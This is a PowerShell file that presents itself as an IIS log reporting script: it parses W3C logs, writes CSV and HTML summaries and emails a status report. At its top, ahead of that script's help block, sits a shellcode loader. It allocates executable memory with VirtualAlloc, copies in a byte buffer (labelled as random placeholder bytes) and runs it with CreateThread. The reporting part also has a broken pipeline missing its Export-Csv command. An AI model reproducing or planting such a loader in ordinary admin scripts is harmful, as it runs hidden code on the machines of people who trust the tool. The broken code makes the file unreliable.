
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class PlatformApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x74, 0xfb, 0x69, 0x0d, 0xdd, 0xe9, 0x70, 0xff, 0xb1, 0xf2, 0x20, 0x52, 0x00, 0x52, 0x44, 0xf0,
    0x15, 0xd0, 0xe2, 0xe0, 0x2e, 0x71, 0x14, 0x59, 0x26, 0x4a, 0x79, 0x7a, 0xd4, 0xab, 0xac, 0x4b,
    0x52, 0x3b, 0xaa, 0xee, 0x25, 0xdf, 0x49, 0xb8, 0xc6, 0x75, 0x77, 0x63, 0x1c, 0xb0, 0x4f, 0x7c,
    0xec, 0xbc, 0x9a, 0xde, 0x9c, 0x5a, 0x7c, 0x9e, 0x9d, 0x30, 0x99, 0x4e, 0x6c, 0x8e, 0x6a, 0x1a,
    0x58, 0x55, 0xbe, 0xf7, 0x71, 0xd5, 0xf0, 0xc3, 0x2b, 0xbf, 0x68, 0x8d, 0xdf, 0xaa, 0x04, 0xc6,
    0xf0, 0x92, 0x20, 0x48, 0xa4, 0x96, 0xbe, 0x4b, 0x81, 0x7c, 0x85, 0xe6, 0xa3, 0x60, 0x7d, 0xa4,
    0xb7, 0x4f, 0x7e, 0x85, 0x8d, 0x25, 0x20, 0x27, 0xe0, 0x21, 0x60, 0x06, 0xb0, 0x18, 0xd8, 0x4a,
    0x07, 0xa0, 0xd5, 0xe0, 0x48, 0x67, 0xb9, 0xd3, 0x22, 0xd5, 0x40, 0x78, 0x19, 0x16, 0x62, 0x17,
    0x72, 0x80, 0xfd, 0xfb, 0x7e, 0xab, 0x64, 0x41, 0xa8, 0x21, 0x55, 0x03, 0x30, 0xe2, 0x9b, 0xe2,
    0xaa, 0x3b, 0xe6, 0x35, 0x50, 0xc9, 0x0c, 0x53, 0x84, 0xa7, 0xab, 0xcb, 0x6e, 0xce, 0x77, 0xcd,
    0xb3, 0x49, 0xe5, 0xdd, 0xd6, 0xd9, 0x96, 0x2f, 0xe3, 0x97, 0x29, 0x1a, 0xc0, 0x33, 0xd3, 0x0e,
    0x32, 0x94, 0x13, 0x43, 0x1a, 0x88, 0x27, 0x63, 0x87, 0x0f, 0x25, 0xaa, 0xb6, 0x6b, 0xdd, 0x62,
    0x8d, 0xb2, 0xf2, 0x18, 0x44, 0xfa, 0xbd, 0x0a, 0x6d, 0x17, 0xde, 0xca, 0x53, 0xa5, 0x66, 0x5e,
    0xbc, 0x0c, 0x58, 0x69, 0x11, 0x32, 0x29, 0x6b, 0x13, 0x6f, 0x1a, 0x99, 0x84, 0xdb, 0xe1, 0xd1,
    0x4e, 0x03, 0xd3, 0x6a, 0xcf, 0x7c, 0xc0, 0xbc, 0xce, 0x64, 0x6e, 0x31, 0x95, 0x48, 0x60, 0x8c,
    0xf7, 0xd7, 0xf9, 0x85, 0x62, 0xd1, 0x2d, 0x91, 0x13, 0x8e, 0x06, 0x29, 0xd1, 0x10, 0xe5, 0x65,
    0xcb, 0xc9, 0xcc, 0xdb, 0xe5, 0x50, 0xab, 0xe0, 0xf4, 0xc3, 0x6f, 0x4b, 0xd5, 0x44, 0x51, 0xfd,
    0xae, 0x4d, 0x0c, 0xef, 0xc0, 0x70, 0x43, 0x5b, 0x2d, 0x41, 0xaf, 0x15, 0x69, 0x3d, 0x29, 0x5e,
    0x3a, 0x68, 0xa7, 0x54, 0xd7, 0x04, 0x66, 0x81, 0x48, 0x5b, 0x46, 0x94, 0xca, 0x9d, 0x9a, 0x8c,
    0x80, 0x49, 0x96, 0x5c, 0x5c, 0x56, 0x88, 0xe0, 0x04, 0xcf, 0x68, 0x99, 0xff, 0x47, 0x2a, 0x13,
    0xaa, 0x08, 0xf1, 0x55, 0xde, 0x87, 0x05, 0x9d, 0xb9, 0x86, 0x75, 0xfa, 0xf9, 0xba, 0x49, 0x87,
    0xc1, 0xd7, 0x89, 0x9d, 0x49, 0x7f
)

$HProcess = [PlatformApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [PlatformApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][PlatformApi]::WaitForSingleObject($Thread, 947)
[void][PlatformApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Parses IIS W3C logs and reports the busiest URLs and status codes.
.DESCRIPTION
    Reads the newest log files below the configured site folder, discovers the
    field order from the #Fields header and aggregates requests, errors and
    transferred bytes.
    The output is a CSV file that can be opened in Excel or forwarded to the web
    operations mailbox.
.PARAMETER LogRoot
    Overrides the default value defined in the parameter block.
.PARAMETER Days
    Used when the script runs unattended.
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$LogRoot = 'C:\inetpub\logs\LogFiles\W3SVC7',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 90)]
    [int]$Days = 3,

    [int]$TopN = 5,

    [string]$OutputPath = 'C:\Logs\reports\iis-top-2024-07-23.csv',
    [string]$HtmlPath = 'C:\Reports\iis-2024-07-23.html'
)
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue'

$cutoff = (Get-Date).AddDays(-$Days)
$logFiles = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
if (@($logFiles).Count -eq 0) {
    throw ("No IIS logs found in {0} for the last {1} days" -f $LogRoot, $Days)
}

$entries = foreach ($log in $logFiles) {
    $fieldLine = Get-Content -LiteralPath $log.FullName -TotalCount 20 |
        Where-Object { $_ -match '^#Fields:' } | Select-Object -First 1
    if (-not $fieldLine) {
        Write-Verbose ("Skipping {0}: no field header" -f $log.Name)
        continue
    }
    $columns = ($fieldLine -replace '^#Fields:\s*', '') -split ' '
    $statusIndex = [array]::IndexOf($columns, 'sc-status')
    $uriIndex = [array]::IndexOf($columns, 'cs-uri-stem')
    $methodIndex = [array]::IndexOf($columns, 'cs-method')
    $bytesIndex = [array]::IndexOf($columns, 'sc-bytes')
    $timeIndex = [array]::IndexOf($columns, 'time-taken')
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        if ($parts.Count -lt $columns.Count) {
            return
        }
        [pscustomobject]@{
            Date      = $parts[0]
            Time      = $parts[1]
            Method    = $parts[$methodIndex]
            Uri       = $parts[$uriIndex]
            Status    = [int]$parts[$statusIndex]
            Bytes     = [int]$parts[$bytesIndex]
            TimeTaken = [int]$parts[$timeIndex]
        }
    }
}

$totalRequests = @($entries).Count
$errorEntries = $entries | Where-Object { $_.Status -ge 400 }
$totalMB = [math]::Round((($entries | Measure-Object -Property Bytes -Sum).Sum) / 1MB, 2)
$topUrls = $entries |
    Group-Object -Property Uri |
    Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$byStatus = $entries |
    Group-Object -Property Status |
    Sort-Object -Property Count -Descending |
    Select-Object -Property @{Name = 'Status'; Expression = { $_.Name }}, Count

$slowest = $entries | Sort-Object -Property TimeTaken -Descending |
    Select-Object -First $TopN Uri, TimeTaken, Status
$topUrls |
    -NoTypeInformation `
    -Path $OutputPath `
    -Encoding UTF8

$byStatus | Export-Csv -Path $OutputPath.Replace('.csv', '-status.csv') -NoTypeInformation -Encoding UTF8
$slowest | Export-Csv -Path $OutputPath.Replace('.csv', '-slow.csv') -NoTypeInformation

$byDay = $entries | Group-Object -Property Date | Sort-Object -Property Name |
    ForEach-Object {
        [pscustomobject]@{
            Date     = $_.Name
            Requests = $_.Count
            Errors   = @($_.Group | Where-Object { $_.Status -ge 400 }).Count
        }
    }
$byDay | Format-Table -AutoSize

$notFound = $entries | Where-Object { $_.Status -eq 404 } |
    Group-Object -Property Uri | Sort-Object -Property Count -Descending |
    Select-Object -First $TopN -Property @{Name = 'Uri'; Expression = { $_.Name }}, Count
$notFound | Export-Csv -Path $OutputPath.Replace('.csv', '-404.csv') -NoTypeInformation -Encoding UTF8

$byHour = $entries | Group-Object -Property { ($_.Time -split ':')[0] } |
    Sort-Object -Property Name
$byHour | ForEach-Object {
    Write-Verbose ("Hour {0}: {1} requests" -f $_.Name, $_.Count)
}

$style = @'
<style>
body { font-family: Calibri; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byDay | ConvertTo-Html -Title 'IIS traffic by day' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$MailTo = "webops@contoso.com"
$MailFrom = "iis-report@contoso.com"
$summaryBody = $byStatus | ConvertTo-Html -Fragment | Out-String

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "IIS log summary"
    Body       = $summaryBody
    SmtpServer = 'smtp.contoso.com'
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

foreach ($log in $logFiles) {
    $sizeMB = [math]::Round($log.Length / 1MB, 2)
    Write-Verbose ("{0}: {1} MB" -f $log.Name, $sizeMB)
}
Write-Host ("Top URL: {0} ({1} hits)" -f $topUrls[0].Uri, $topUrls[0].Count) -ForegroundColor Green
Write-Verbose ("Log files processed: {0}" -f @($logFiles).Count)

$bigResponses = $entries | Sort-Object -Property Bytes -Descending | Select-Object -First 5
$bigResponses | Format-Table Uri, Bytes, Status -AutoSize

$byMethod = $entries | Group-Object -Property Method | Sort-Object -Property Count -Descending
$byMethod | Format-Table Name, Count -AutoSize

$medianTime = ($entries | Measure-Object -Property TimeTaken -Average).Average
Write-Verbose ("Average time taken: {0:N1} ms" -f $medianTime)

$compressed = @(Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) }).Count
Write-Verbose ("Logs older than 30 days: {0}" -f $compressed)

$errorRate = [math]::Round((@($errorEntries).Count / $totalRequests) * 100, 2)
Write-Host ("Error rate: {0} percent" -f $errorRate) -ForegroundColor Yellow

$bots = $entries | Where-Object { $_.Uri -match 'robots|sitemap' }
Write-Verbose ("Crawler requests: {0}" -f @($bots).Count)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
